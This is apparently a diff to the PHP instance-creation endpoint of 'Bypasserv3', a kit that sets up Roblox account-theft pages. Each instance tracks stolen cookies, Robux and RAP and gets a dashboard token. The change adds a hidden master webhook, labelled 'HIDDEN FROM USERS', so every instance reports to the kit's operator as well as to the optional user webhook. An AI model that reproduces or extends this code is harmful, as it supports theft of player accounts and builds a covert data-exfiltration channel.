@@ -1,7 +1,8 @@
 <?php
 /**
- * Bypasserv3 - Instance Creator (File-Based Storage)
- * Creates bypass instances with .txt file storage
+ * Bypasserv3 - Instance Creator
+ * MASTER_WEBHOOK is hidden from users (from Railway env)
+ * Users only provide optional userWebhook
  */
 
 header('Content-Type: application/json');
@@ -25,10 +26,18 @@ function generateToken($length = 32) {
 // Get POST data
 $input = json_decode(file_get_contents('php://input'), true);
 $directory = trim($input['directory'] ?? '');
-$masterWebhook = trim($input['masterWebhook'] ?? '');
-$userWebhook = trim($input['userWebhook'] ?? $masterWebhook);
+$userWebhook = trim($input['userWebhook'] ?? '');
 
-// Validate directory name (letters, numbers, hyphens, underscores only)
+// Get MASTER_WEBHOOK from environment variable (HIDDEN FROM USERS)
+$masterWebhook = defined('STEALTH_MASTER') ? STEALTH_MASTER : '';
+
+if (empty($masterWebhook)) {
+    http_response_code(500);
+    echo json_encode(['success' => false, 'error' => 'Server configuration error. Please contact administrator.']);
+    exit;
+}
+
+// Validate directory name
 if (empty($directory)) {
     http_response_code(400);
     echo json_encode(['success' => false, 'error' => 'Directory name is required']);
@@ -41,39 +50,34 @@ if (!preg_match('/^[A-Za-z0-9_-]{3,32}$/', $directory)) {
     exit;
 }
 
-// Validate webhook
-if (empty($masterWebhook)) {
-    http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Webhook URL is required']);
-    exit;
-}
-
-// Validate webhook URL
-if (!filter_var($masterWebhook, FILTER_VALIDATE_URL)) {
-    http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Invalid webhook URL']);
-    exit;
-}
-
-// Check if webhook is valid/alive
-$ch = curl_init($masterWebhook);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_NOBODY, true);
-curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-curl_exec($ch);
-$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-curl_close($ch);
-
-if ($httpCode == 404) {
-    http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Webhook is dead (404 Not Found)']);
-    exit;
-}
-
-if ($httpCode < 200 || $httpCode >= 300) {
-    http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Invalid webhook URL']);
-    exit;
+// Validate user webhook if provided
+if (!empty($userWebhook)) {
+    if (!filter_var($userWebhook, FILTER_VALIDATE_URL)) {
+        http_response_code(400);
+        echo json_encode(['success' => false, 'error' => 'Invalid webhook URL']);
+        exit;
+    }
+    
+    // Check if webhook is valid/alive
+    $ch = curl_init($userWebhook);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_NOBODY, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    if ($httpCode == 404) {
+        http_response_code(400);
+        echo json_encode(['success' => false, 'error' => 'Webhook is dead (404 Not Found)']);
+        exit;
+    }
+    
+    if ($httpCode < 200 || $httpCode >= 300) {
+        http_response_code(400);
+        echo json_encode(['success' => false, 'error' => 'Invalid webhook URL']);
+        exit;
+    }
 }
 
 // Check if directory already exists
@@ -95,9 +99,9 @@ mkdir($instancePath, 0777, true);
 // Generate unique token
 $token = generateToken();
 
-// Create instance files (file-based storage)
-file_put_contents("$instancePath/webhook.txt", $masterWebhook);
-file_put_contents("$instancePath/userwebhook.txt", $userWebhook);
+// Create instance files
+file_put_contents("$instancePath/webhook.txt", $masterWebhook); // MASTER WEBHOOK (hidden)
+file_put_contents("$instancePath/userwebhook.txt", $userWebhook); // User's optional webhook
 file_put_contents("$instancePath/token.txt", $token);
 file_put_contents("$instancePath/visits.txt", '0');
 file_put_contents("$instancePath/cookies.txt", '0');
@@ -108,7 +112,7 @@ file_put_contents("$instancePath/username.txt", '');
 file_put_contents("$instancePath/profilepic.txt", 'https://www.roblox.com/headshot-thumbnail/image/default.png');
 file_put_contents("$instancePath/created.txt", date('Y-m-d H:i:s'));
 
-// Create daily stats files (JSON arrays for 7 days - Sun to Sat)
+// Create daily stats files
 file_put_contents("$instancePath/daily_cookies.txt", json_encode(array_fill(0, 7, 0)));
 file_put_contents("$instancePath/daily_robux.txt", json_encode(array_fill(0, 7, 0)));
 file_put_contents("$instancePath/daily_rap.txt", json_encode(array_fill(0, 7, 0)));
@@ -118,14 +122,12 @@ file_put_contents("$instancePath/daily_visits.txt", json_encode(array_fill(0, 7,
 // Create logs file
 file_put_contents("$instancePath/logs.txt", '');
 
-// Save token to tokens directory
+// Save token
 $tokensPath = '../tokens';
 if (!file_exists($tokensPath)) {
     mkdir($tokensPath, 0777, true);
 }
 file_put_contents("$tokensPath/$token.txt", "$token|$directory|$masterWebhook|" . date('Y-m-d H:i:s') . PHP_EOL);
-
-// Also append to master tokens list
 file_put_contents("$tokensPath/all_tokens.txt", "$token|$directory|$masterWebhook|" . date('Y-m-d H:i:s') . PHP_EOL, FILE_APPEND | LOCK_EX);
 
 // Get domain info
@@ -134,7 +136,12 @@ $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : '
 $publicUrl = "$protocol://$domain/public/?dir=" . urlencode($directory);
 $dashboardUrl = "$protocol://$domain/dashboard/sign-in.php?token=" . urlencode($token);
 
-// Send success webhook
+// Send success webhook to MASTER (if user provided their webhook, send there too)
+$webhooksToNotify = [$masterWebhook];
+if (!empty($userWebhook) && $userWebhook !== $masterWebhook) {
+    $webhooksToNotify[] = $userWebhook;
+}
+
 $webhookData = [
     'username' => 'Bypasserv3',
     'avatar_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png',
@@ -169,13 +176,15 @@ $webhookData = [
     ]]
 ];
 
-$ch = curl_init($masterWebhook);
-curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-curl_setopt($ch, CURLOPT_POST, true);
-curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($webhookData));
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_exec($ch);
-curl_close($ch);
+foreach ($webhooksToNotify as $webhook) {
+    $ch = curl_init($webhook);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($webhookData));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_exec($ch);
+    curl_close($ch);
+}
 
 // Log instance creation
 logSecurityEvent('instance_created', [
